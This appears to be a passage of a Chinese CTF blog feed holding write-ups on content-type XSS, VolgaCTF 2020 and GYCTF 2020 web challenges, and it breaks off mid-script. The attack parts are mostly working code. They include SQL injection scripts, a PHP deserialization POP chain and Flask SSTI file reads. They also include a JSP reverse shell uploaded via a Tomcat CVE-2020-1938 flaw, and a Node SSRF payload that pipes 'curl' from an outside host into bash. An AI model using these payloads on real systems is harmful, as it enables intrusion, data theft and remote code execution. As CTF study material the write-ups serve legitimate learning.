        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>知识全靠writeup得到，师傅们tqlllll</p><h2 id="MIME-嗅探"><a href="#MIME-嗅探" class="headerlink" title="MIME 嗅探"></a>MIME 嗅探</h2><p>如果<code>content-type</code>是<code>text-plain</code>或者<code>空</code>的话</p><p>浏览器会根据内容格式来决定使用什么解析</p><p>比如:</p><pre><code>&lt;script&gt;alert()&lt;/script&gt;</code></pre><p>就按照<code>text/html</code>来解析</p><p>要防止<code>MIME</code>嗅探，设置</p><pre><code>X-Content-Type-Options：nosniff</code></pre><h2 id="设置"><a href="#设置" class="headerlink" title="设置 */*"></a>设置 <code>*/*</code></h2><p>表示让firefox 猜测 mime-type ，</p><p>即使设置了 <code>X-Content-Type-Options：nosniff</code></p><p>也可以使用，直接忽略，tqllll</p><p><strong>这个在chrome也可以</strong></p><h2 id="设置text-rdf"><a href="#设置text-rdf" class="headerlink" title="设置text/rdf"></a>设置<code>text/rdf</code></h2><p>然后xss 内容是</p><pre><code>&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;</code></pre><p>本地测试</p><pre><code>&lt;?phpheader('content-type:text/rdf');?&gt;&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;</code></pre><h2 id="设置multipart-x-mixed-replace"><a href="#设置multipart-x-mixed-replace" class="headerlink" title="设置multipart/x-mixed-replace;"></a>设置<code>multipart/x-mixed-replace;</code></h2><p>tqlllll</p><p>irefox 有一个 <code>multipart/x-mixed-replace;</code> 类型</p><p>支持多部分响应</p><p>需要有一个 boundary 来分割</p><p>本地测试：</p><pre><code>&lt;?phpheader('content-type: multipart/x-mixed-replace;boundary="XXMIMEBOUNDARY"');?&gt;--XXMIMEBOUNDARYContent-type: text/html&lt;script&gt;alert()&lt;/script&gt;--XXMIMEBOUNDARY</code></pre><p>例子：</p><pre><code>Content-Type: Multipart/mixed; boundary="sample_boundary";Multipart not supported :(--sample_boundaryContent-Type: text/css; charset=utf-8Content-Location: http://localhost:2080/file.cssbody{ background-color: yellow;}--sample_boundaryContent-Type: application/x-javascript; charset=utf-8Content-Location: http://localhost:2080/file.jsalert("Hello from a javascript!!!");--sample_boundary</code></pre><p>师傅们tttttttttttqqqqqqqqlllllllllllll</p><h2 id="chrome-中的content-type-xss"><a href="#chrome-中的content-type-xss" class="headerlink" title="chrome 中的content-type xss"></a>chrome 中的content-type xss</h2><h3 id="设置-text-xsl"><a href="#设置-text-xsl" class="headerlink" title="设置 text/xsl"></a>设置 <code>text/xsl</code></h3><p>被处理为 xml</p><pre><code>Content-Type: text/xsl&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;</code></pre><h3 id="设置为text-plain-text-html"><a href="#设置为text-plain-text-html" class="headerlink" title="设置为text/plain;,text/html"></a>设置为<code>text/plain;,text/html</code></h3><p>支持多种引号分割</p><pre><code>Content-Type: text/plain;,text/html&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre><h2 id="关于-Edge-的content-type-xss"><a href="#关于-Edge-的content-type-xss" class="headerlink" title="关于 Edge 的content-type xss"></a>关于 Edge 的content-type xss</h2><h3 id="设置为text-vtt"><a href="#设置为text-vtt" class="headerlink" title="设置为text/vtt"></a>设置为<code>text/vtt</code></h3><p>被处理为 html</p><pre><code>Content-Type: text/vtt&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VolgaCTF2020 Qualifier部分writeup</title>
      <link href="/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/"/>
      <url>/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太菜了，才水了两道题</p><h2 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h2><p>注册登录，看到请求：</p><p>登录的:</p><pre><code>{"query":"query login($input: LoginUser) {\n  login(user: $input) {\n  token login name email \n  }\n}\n","variables":{"input":{"login":"123","password":"123"}}}</code></pre><p>登录后的</p><pre><code>{"query":"query {books{pic \n author }}"}</code></pre><p>是用了<code>graphQL</code></p><p>可以<code>graphQL注入</code></p><pre><code>{"query":"query {__schema {types{ name } mutationType{name}}}"}</code></pre><p>然后得到详细情况</p><pre><code>{"query":"query {  __type(name: \"Query\") { name fields (includeDeprecated: true){ name type { name kind ofType{name kind description}}}}}"}</code></pre><p>看到有一个 <code>testGetUsersByFilter</code></p><p>然后看到它的 <code>oftype</code>等情况</p><p>得到用法，和登录的那个类似</p><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"admin","email":"or","name":"yuewuhen"}}}</code></pre><p>发现可以查询，</p><p>那么尝试是否有<code>mysql</code>或者<code>sqlite</code>等注入点</p><p>FUZZ后发现单引号被过滤了</p><p>那么应该是<code>sql</code>注入，而且查询的情况是使用了<code>or</code>查询</p><p>所以可以考虑用 <code>\\</code> 来注入</p><p>然后<code>FUZZ</code>发现是使用了<code>mysql</code>，而且空格被过滤了</p><p>最后就是简单的mysql注入了：</p><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"\\","email":"order/**/by/**/6;#"}}}</code></pre><pre><code>{"query":"query testGetUsersByFilter($input: UserFilter) {\n  testGetUsersByFilter(filter: $input) {\n   login  email name\n  }\n}\n","variables":{"input":{"login":"\\","email":"union/**/select/**/1,(select/**/flag/**/from/**/flag),3,4,5,6#"}}}</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/library.png" alt=""></p><h2 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h2><p>打开是一个 <code>html</code>页面 什么都没有，<code>FUZZ</code>报错发现是</p><p><code>tomcat/9.0.24</code></p><p>前几天刚复现了<code>cve-2020-1938</code> 的<code>tomcat</code>漏洞</p><p>可以任意文件读取，如果有上传甚至可以<code>RCE</code></p><p>猜测<code>webapp</code>叫做<code>NetCorp</code>,</p><p>先查看<code>web.xml</code></p><p>外国的比赛加个 <code>proxychains</code>快点</p><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp WEB-INF/web.xml  netcorp.q.2020.volgactf.ru </code></pre><p>web.xml</p><pre><code>&lt;web-app&gt;  &lt;display-name&gt;NetCorp&lt;/display-name&gt;  &lt;servlet&gt;      &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;      &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt;      &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;      &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;      &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;        &lt;display-name&gt;ServeComplaint&lt;/display-name&gt;        &lt;description&gt;Complaint info&lt;/description&gt;        &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;        &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;    &lt;error-page&gt;        &lt;error-code&gt;404&lt;/error-code&gt;        &lt;location&gt;/404.html&lt;/location&gt;    &lt;/error-page&gt;&lt;/web-app&gt;</code></pre><p>很明显了，查看一下代码</p><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  WEB-INF/classes/ru/volgactf/netcorp/ServeScreenshotServlet.class netcorp.q.2020.volgactf.ru </code></pre><p><strong>代码</strong></p><pre><code>//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package ru.volgactf.netcorp;import java.io.File;import java.io.IOException;import java.io.PrintWriter;import java.math.BigInteger;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Iterator;import javax.servlet.ServletConfig;import javax.servlet.ServletException;import javax.servlet.annotation.MultipartConfig;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.Part;@MultipartConfigpublic class ServeScreenshotServlet extends HttpServlet {    private static final String SAVE_DIR = "uploads";    public ServeScreenshotServlet() {        System.out.println("ServeScreenshotServlet Constructor called!");    }    public void init(ServletConfig config) throws ServletException {        System.out.println("ServeScreenshotServlet \"Init\" method called");    }    public void destroy() {        System.out.println("ServeScreenshotServlet \"Destroy\" method called");    }    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {        String appPath = request.getServletContext().getRealPath("");        String savePath = appPath + "uploads";        File fileSaveDir = new File(savePath);        if (!fileSaveDir.exists()) {            fileSaveDir.mkdir();        }        String submut = request.getParameter("submit");        if (submut != null &amp;&amp; !submut.equals("true")) {        }        Iterator var7 = request.getParts().iterator();        while(var7.hasNext()) {            Part part = (Part)var7.next();            String fileName = this.extractFileName(part);            fileName = (new File(fileName)).getName();            String hashedFileName = this.generateFileName(fileName);            String path = savePath + File.separator + hashedFileName;            if (!path.equals("Error")) {                part.write(path);            }        }        PrintWriter out = response.getWriter();        response.setContentType("application/json");        response.setCharacterEncoding("UTF-8");        out.print(String.format("{'success':'%s'}", "true"));        out.flush();    }    private String generateFileName(String fileName) {        try {            MessageDigest md = MessageDigest.getInstance("MD5");            md.update(fileName.getBytes());            byte[] digest = md.digest();            String s2 = (new BigInteger(1, digest)).toString(16);            StringBuilder sb = new StringBuilder(32);            int i = 0;            for(int count = 32 - s2.length(); i &lt; count; ++i) {                sb.append("0");            }            return sb.append(s2).toString();        } catch (NoSuchAlgorithmException var8) {            var8.printStackTrace();            return "Error";        }    }    private String extractFileName(Part part) {        String contentDisp = part.getHeader("content-disposition");        String[] items = contentDisp.split(";");        String[] var4 = items;        int var5 = items.length;        for(int var6 = 0; var6 &lt; var5; ++var6) {            String s = var4[var6];            if (s.trim().startsWith("filename")) {                return s.substring(s.indexOf("=") + 2, s.length() - 1);            }        }        return "";    }}</code></pre><p>文件名经过<code>md5</code></p><p>那就上传<code>jsp</code>文件，然后<code>rce</code>了</p><pre><code>&lt;%@page import="java.lang.*"%&gt;&lt;%@page import="java.util.*"%&gt;&lt;%@page import="java.io.*"%&gt;&lt;%@page import="java.net.*"%&gt;&lt;%  class StreamConnector extends Thread  {    InputStream zd;    OutputStream fm;    StreamConnector( InputStream zd, OutputStream fm )    {      this.zd = zd;      this.fm = fm;    }    public void run()    {      BufferedReader fr  = null;      BufferedWriter ctw = null;      try      {        fr  = new BufferedReader( new InputStreamReader( this.zd ) );        ctw = new BufferedWriter( new OutputStreamWriter( this.fm ) );        char buffer[] = new char[8192];        int length;        while( ( length = fr.read( buffer, 0, buffer.length ) ) &gt; 0 )        {          ctw.write( buffer, 0, length );          ctw.flush();        }      } catch( Exception e ){}      try      {        if( fr != null )          fr.close();        if( ctw != null )          ctw.close();      } catch( Exception e ){}    }  }  try  {    String ShellPath;if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {  ShellPath = new String("/bin/sh");} else {  ShellPath = new String("cmd.exe");}    Socket socket = new Socket( "ip", 23561 );    Process process = Runtime.getRuntime().exec( ShellPath );    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();  } catch( Exception e ) {}%&gt;</code></pre><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  uploads/d17faea05c8d3f2ff9b5f67f6fa0e7a6 netcorp.q.2020.volgactf.ru</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/netcorp.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020新春战役GYCTF writeup</title>
      <link href="/2020/02/24/gyctf2020-writeup/"/>
      <url>/2020/02/24/gyctf2020-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>新春防疫的ctf公益比赛，有些题目可以在<code>buuoj</code>上面复现</strong></p><p>前两天做了发现差不多全是<code>sql注入</code>，要吐了，第三天的题还可以</p><h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h3 id="简单的招聘"><a href="#简单的招聘" class="headerlink" title="简单的招聘"></a>简单的招聘</h3><p>在注册 登录那里有<code>insert into</code> 注入，<br>注入结果可以在 <code>pages-profile.php</code>看到</p><p><strong>注册页面</strong></p><pre><code>regname=a','1','1')#&amp;regpass=1</code></pre><p>发现成功注册，但是登录失败，盲猜密码经过了md5 加密</p><p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select group_concat(column_name) from information_schema.columns where table_name=’flag’))#&amp;regpass=admin%27%7C%7C%271</p><p>获取列名</p><p>获取flag</p><p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select flaaag from flag))#&amp;regpass=admin%27%7C%7C%271</p><p>数据库情况:</p><pre><code>表名：backup,flag,userflag:id,flaaag</code></pre><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>送分题</p><p>后缀<code>php3</code><br>上传成功在  执行 <code>/readflag</code>获得<code>flag</code></p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>时间盲注，select 没了，提示<code>flag</code>在<code>fl4g</code>中</p><p>用 regexp注入</p><pre><code>import requestsimport timeimport stringurl='http://232047a84d5f4d3684012ab422bff8ae488f8539fdda475c.changame.ichunqiu.com/'def inj(payload):    t1=time.time()    req=requests.get(url,params={'id':payload})    t2=time.time()    print(t2-t1)    if t2-t1&gt;2:        return Trueflag='^'payload='0||if((fl4g regexp "{}"),sleep(2),1)'inj(payload)stri='-qwertyuiopasdfghjklzxcvbnm1234567890{}_='for i in range(50):    for j in stri:        tmp=payload.format(flag+j)        print(tmp)        a=inj(tmp)        if a is True:            flag+=j            print(flag)            break</code></pre><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这题有点意思</p><ul><li>代码审计</li><li>反序列化字符串逃逸</li><li>pop链</li></ul><p><strong>CtrlCase 可以用反序列化逃逸控制</strong></p><p>然后就可以构造pop链</p><p>然后需要找 <code>__destruct</code> 的方法 利用下去</p><ul><li><p>开始想 用反序列化 update 改admin的密码，但是失败了(本地成功。。</p></li><li><p>inseRt iNto 插入用户名也失败了(本地成功。。</p></li><li><p>后来 select 1,md5(1) from user where username=?</p></li></ul><p>看到有回显 1 ，那就注入密码</p><p><strong>pop 链:</strong></p><pre><code>&lt;?phpclass User{    public $id;    public $age = null;    public $nickname = null;}class Info{    public $age;    public $nickname;    public $CtrlCase;}Class UpdateHelper{    public $id;    public $newinfo;    public $sql;}class dbCtrl{    public $hostname="127.0.0.1";    public $dbuser="noob123";    public $dbpass="noob123";    public $database="noob123";    public $name='c4ca4238a0b923820dcc509a6f75849b';    public $password="1";    public $mysqli;    public $token='admin';}$a=new Info();$b=new UpdateHelper();$c=new User();$d=new Info();$e=new dbCtrl();$d-&gt;CtrlCase=$e;$c-&gt;nickname=$d;#$c-&gt;age='update user SET password=? where 1';$c-&gt;age='select password,md5(1) from user where username=? oR 1';#$c-&gt;age='insErt iNto user (username,password,age,nickname) valueS ("m0on",?,"1","1")';$b-&gt;sql=$c;$a-&gt;CtrlCase=$b;$a-&gt;nickname="1";$las=serialize($a);echo $las."\n";echo strlen($las);</code></pre><p>从 <code>";s:8:"CtrlCase</code> 开始截取</p><p>然后需要反序列化逃逸 ，使用 *和union 来变成hacker逃逸</p><p>用 <code>python</code> 简单处理一下</p><pre><code>a='''";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}'''b=len(a)c=b//5d=''d+='*'*c+(b-c*5)*'union'+aprint(d)</code></pre><p>构造</p><pre><code>age=1&amp;nickname=***************************************************************************************************";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}</code></pre><p>md5解密 是yingyingying ，看来应该可以弱口令的吧，没有试。。。。醉了</p><p>然后登录在 update.php得到flag</p><h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>叠堆注入 ， set 不能用 ，那就 用handler </p><p>?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;</p><pre><code>http://40509bd15cd7405893c4b46c93a1efe7772e15de2f3542b3.changame.ichunqiu.com/?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;</code></pre><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p>pdo 预处理 使用了 <code>gbk</code>编码，导致宽字节注入，</p><p>叠堆 注入 ，</p><p><code>select</code> 不能用 ，用<code>set</code> 来注入</p><p>,然后时间盲注</p><pre><code>import requestsimport timeimport binasciiurl='http://a265f2d3937e403b89a0563c2dd9e88f7de2577c581345ab.changame.ichunqiu.com/?id='def requ(payload):    tmp='1%dd%27;set%20@a=0x{};prepare%20haha%20from%20@a;execute%20haha;'.format(hexpay(payload))    t1=time.time()    req=requests.get(url+tmp)    t2=time.time()    if t2-t1&gt;2:        return Truedef hexpay(payload):    pay=binascii.b2a_hex(payload.encode()).decode()    return paydb='^'for i in range(1,100):    #for j in range(40,130):    for j in '1234567890abcdefABCDEFz':        print(j)        #payload='''select if(ascii(substr(database(),{},1))={},sleep(2),1)'''.format(str(i),str(j))        #payload='''select if(ascii(substr(( select group_concat(table_name) from information_schema.tables where table_schema='pdotest'  ),{},1))={},sleep(2),1)'''.format(str(i),str(j))        #payload='''select if((select hex(group_concat(column_name)) regexp '{}' from information_schema.columns where table_name='table1' ),sleep(2),1)'''.format(db+j)        payload='''select if((select hex(fllllll4g) regexp '{}' from table1 ),sleep(2),1)'''.format(db+j)        #print(payload)        a=requ(payload)        if a is True:            db+=j            print(db)            break        if j=='z':            print('false********8')</code></pre><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>先是获得 表名 ，</p><p>or 不能用了 ，</p><p>绕过<code>information_schema</code> </p><p><code>innodb</code> 也不能用了</p><p>用<code>sys.schema_table_statistics_with_buffer</code></p><p>然后 列名 无法得到，</p><p>union select 又不能用，版本<code>5.7</code></p><p>那就看官方文档 ，</p><p>看到了 </p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html</a></p><p>(column1,column2) = (1,1);</p><p>可以用类似盲注方法 </p><p>(column1,column2) &gt;= (1,1);</p><p>发现 两列的 所以 </p><p><code>where  (1,1)&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code></p><p>，试过几个发现 ， </p><p> <code>where  (1,'a')&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code><br>这样会出错，返回500 ，</p><p>而 第一列 测试发现int型的，</p><p>所以第二列是flag</p><p>所以用 <code>(select 0x61)</code>这样的代表第二列</p><pre><code>import requestsimport timeimport binasciiurl='http://e1feb1a7ba234a06a1669d7949ac16b7c16cbab87af44d76.changame.ichunqiu.com/index.php'def inj(payload):    req=requests.post(url,data={'id':payload})    if 'Hello CQGAME' in req.text:        return Truedb=''for i in range(50):    for j in range(30,130):        #payload='''2-(select hex( ( select database() )) regexp '{}'  )'''.format(db+j)        #payload='''2-(select hex( ( select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database() )) regexp '{}'  )'''.format(db+j)        payload='''3-(select 1   where ((select 1),(select {} ))&gt;= (select * from f1ag_1s_h3r3_hhhhh))'''.format('0x'+binascii.b2a_hex(db.encode()).decode()+hex(j).replace('0x',''))        print(payload)        a=inj(payload)        if  a is True:            db+=chr(j-1)            print(db)            break        if j==129:            print('false **********8')</code></pre><p>得到：</p><p>FLAG{2612D538-3A53-4B94-9079-567F7B6EB427|</p><p>只要把 最后一个 | 换成 }</p><p>再全部变成小写就可以了</p><h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p><strong>源代码：</strong></p><pre><code>var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug');var morgan = require('morgan');const multer = require('multer');app.use(multer({dest: './dist'}).array('file'));app.use(morgan('short'));app.use("/uploads",express.static(path.join(__dirname, '/uploads')))app.use("/template",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) {    var action = req.query.action?req.query.action:"index";    if( action.includes("/") || action.includes("\\") ){        res.send("Errrrr, You have been Blocked");    }    file = path.join(__dirname + '/template/'+ action +'.pug');    var html = pug.renderFile(file);    res.send(html);});app.post('/file_upload', function(req, res){    var ip = req.connection.remoteAddress;    var obj = {        msg: '',    }    if (!ip.includes('127.0.0.1')) {        obj.msg="only admin's ip can use it"        res.send(JSON.stringify(obj));        return     }    fs.readFile(req.files[0].path, function(err, data){        if(err){            obj.msg = 'upload failed';            res.send(JSON.stringify(obj));        }else{            var file_path = '/uploads/' + req.files[0].mimetype +"/";            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if(!fs.existsSync(__dirname + file_path)){                try {                    fs.mkdirSync(__dirname + file_path)                } catch (error) {                    obj.msg = "file type error";                    res.send(JSON.stringify(obj));                    return                }            }            try {                fs.writeFileSync(dir_file,data)                obj = {                    msg: 'upload success',                    filename: file_path + file_name                }             } catch (error) {                obj.msg = 'upload failed';            }            res.send(JSON.stringify(obj));            }    })})app.get('/source', function(req, res) {    res.sendFile(path.join(__dirname + '/template/source.txt'));});app.get('/core', function(req, res) {    var q = req.query.q;    var resp = "";    if (q) {        var url = 'http://localhost:8081/source?' + q        console.log(url)        var trigger = blacklist(url);        if (trigger === true) {            res.send("error occurs!            ");                    } else {                        try {                            http.get(url, function(resp) {                                resp.setEncoding('utf8');                                resp.on('error', function(err) {                                if (err.code === "ECONNRESET") {                                 console.log("Timeout occurs");                                 return;                                }                               });                                resp.on('data', function(chunk) {                                    try {                                     resps = chunk.toString();                                     res.send(resps);                                    }catch (e) {                                       res.send(e.message);                                    }                                }).on('error', (e) =&gt; {                                     res.send(e.message);});                            });                        } catch (error) {                            console.log(error);                        }                    }                } else {                    res.send("search param 'q' missing!");                }            })            function blacklist(url) {                var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];                var arrayLen = evilwords.length;                for (var i = 0; i &lt; arrayLen; i++) {                    const trigger = url.includes(evilwords[i]);                    if (trigger === true) {                        return true                    }                }            }            var server = app.listen(8081, function() {                var host = server.address().address                var port = server.address().port                console.log("Example app listening at http://%s:%s", host, port)            })</code></pre><p>思路很清晰<br>/file_upload 有一个限制必须 127.0.0.1<br>先 利用node 的cve ，拆分攻击，http.get() 可以 用 unicode 字符，来CRLF和SSRF</p><p>利用SSRF上传个 文件 ，然后用pug 执行命令 </p><p>可惜一直 被 content-length 坑了 ，这个如果不精确 就会让 服务器 堵塞 30秒，到最后只剩下30分钟才发现这个问题。 难怪一直 失败， 比赛结束之后做出来了，</p><p>poc:弹shell</p><pre><code>import urllibimport requestspayload='''dasdas HTTP/1.1Host:127.0.0.1:8081connection:keep-alivePOST /file_upload HTTP/1.1Host: 123.57.212.112:33323User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://123.57.212.112:33323/?action=uploadContent-Type: multipart/form-data; boundary=---------------------------7583695899588870231116957455Content-Length: 404Connection: closeUpgrade-Insecure-Requests: 1-----------------------------7583695899588870231116957455Content-Disposition: form-data; name="file"; filename="ggg.pug"Content-Type: ../../../../../usr/src/app/uploads/-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl http://mu2766c382.zicp.vip:18430/shell | /bin/bash'))")()-----------------------------7583695899588870231116957455--GET / HTTP/1.1connection:close'''.replace("\r\n","\n")payload=payload.replace("\n","\r\n")print(payload)payload=payload.replace("\r",'\u010D').replace("\n",'\u010a').replace(' ','\u0120').replace('"','\u0122').replace("'",'\u0127').replace('-','\u012d').replace('=','\u013d').replace('/','\u012f')payload=payload.replace('o','\u016f').replace('e','\u0165').replace('|','\u017c').replace('a','\u0161')url='http://182.92.243.154:33322/core?q='req=requests.get(url+urllib.parse.quote(payload))print(req.text)</code></pre><p>这些blacklist 都可以使用 </p><p><code>replace('o','\u016f')</code></p><p><code>replace('e','\u0165')</code> 绕过</p><p>action 那里可以使用 数组绕过 <code>/</code>和 <code>\</code></p><p>然后访问 </p><pre><code>http://182.92.243.154:33322/?action[]=../../../../../../usr/src/app/uploads/ggg</code></pre><p>执行命令 </p><p>cd /</p><p>cat /flag,txt</p><h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p>python3.7</p><p>利用 SSTI 读取文件</p><p>然后 debug pin 执行命令</p><p>在 base64 decode 那里 存在SSTI，这个SSTI 执行命令的被禁了，</p><p>读取文件可以使用 </p><p><code>&lt;class 'urllib.request.URLopener'&gt;</code></p><p>这个类</p><p>使用 base64编码的 </p><pre><code>{{session['__class__'].__mro__[11].__subclasses__()}}</code></pre><p>获取 </p><pre><code>csrf_token=ImQ2ZDgzM2Q0NWYzYThjYjVmZWY2NTU3NjNhYzgxNTRhNTNjNTg1ZmUi.XlNFsg.YPgw6WxuZ6-ZC8z0v129Lf1h42g&amp;text=e3tzZXNzaW9uWydfX2NsYXNzX18nXS5fX21yb19fWzExXS5fX3N1YmNsYXNzZXNfXygpfX0= &amp;submit=%E6%8F%90%E4%BA%A4</code></pre><p>然后 读取 pin 需要的文件</p><pre><code>{{session['__class__'].__mro__[11].__subclasses__()[367]().open_file('/sys/class/net/eth0/address').read()}}</code></pre><p>base64 编码</p><p>再读取 <code>/proc/self/cgroup</code> 获取 <code>machine-id</code></p><p>读取 <code>/etc/passwd</code>获取 用户名 <code>flaskweb</code></p><p>脚本:<br><code>machine-id</code> <code>用户名</code>，<code>/sys/class/net/eth0/address</code>要自己获取</p><pre><code>import hashlibfrom itertools import chainprobably_public_bits = [    'flaskweb'# username    'flask.app',# modname    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [    